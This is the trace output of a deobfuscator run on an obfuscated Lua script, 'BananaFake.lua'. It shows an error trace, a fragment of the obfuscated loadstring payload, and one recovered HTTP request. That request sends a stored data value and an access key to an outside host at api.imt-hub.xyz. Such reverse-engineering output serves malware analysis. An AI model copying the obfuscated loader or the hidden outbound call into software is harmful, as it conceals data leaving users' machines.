-- Deobfuscated by deobf (dynamic trace)
-- source: BananaFake.lua
-- NOTE: reconstructed from observed behaviour; branches that were not taken
--       during the trace are missing and conditions are only noted in comments.
-- run status: script error: table overflow
--   C:/Users/User/Desktop/EGO/Deobfuscator/newout/Folder/BananaFake.deobf.luau.harness.luau:5371
--   [string "Luraph"]:1
--   [string "Luraph"]:1
--   Script:3
--   C:/Users/User/Desktop/EGO/Deobfuscator/newout/Folder/BananaFake.deobf.luau.harness.luau:5376
--   
-- 47 statements recorded in 1.19s
-- non-standard globals touched: ACTIVE_KEY, LUAW_DATA

-- loadstring() of 269263 bytes: "return setmetatable({W=function(M,g,s,H,C,W,X,e,j)if e<=81 then if e<=80 then local Z=M[88](g,X+1);local q,_=Z<128 and 348 or 95,C[1];return q,C[2],_,X,Z,H;else local Z,q=1+X,C[1];return 219,C[2],q,Z,"
-- [deobf] removed 54 lines of the obfuscator's environment/anti-tamper probes
http_request({ Method = "GET", Url = "http://api.imt-hub.xyz/gate?v=b&s=" .. LUAW_DATA[8] .. "&k=" .. ACTIVE_KEY })
